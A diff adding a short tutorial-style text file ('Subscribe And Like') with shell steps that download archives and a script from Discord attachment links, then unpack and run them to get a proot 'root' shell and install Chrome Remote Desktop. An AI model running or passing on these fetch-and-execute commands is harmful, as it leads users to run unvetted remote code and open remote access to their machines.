@@ -1,0 +1,15 @@
+Subscribe And Like :)
+ 
+Script For Root:
+cd /tmp
+wget https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip
+unzip yt.zip
+unzip root.zip
+tar -xvf root.tar.xz
+./dist/proot -S . /bin/bash
+ 
+Script For Install Desktop And Chrome Remote Desktop:
+apt update && apt install wget -y
+wget https://cdn.discordapp.com/attachments/971328875487432724/971407810594222190/sub.sh
+chmod +x sub.sh
+bash sub.sh
